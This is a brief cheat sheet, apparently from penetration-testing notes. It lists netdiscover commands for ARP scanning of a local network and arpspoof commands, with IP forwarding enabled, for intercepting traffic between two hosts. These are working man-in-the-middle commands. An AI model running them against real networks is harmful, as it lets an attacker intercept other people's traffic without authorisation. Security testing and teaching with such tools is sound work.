# NetDiscover (ARP Scanning)

```sh
netdiscover -i eth0
```

or

```sh
netdiscover -r x.x.x.0/24
```

## Dsniff Arpspoof

First enable Linux box to act as a router:

`echo 1 > /proc/sys/net/ipv4/ip_forward`

Then run `arpspoof`:

`arpspoof -i <interface> -t <target> -r <host>`

For example, to intercept traffic between targets, use:

`arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16`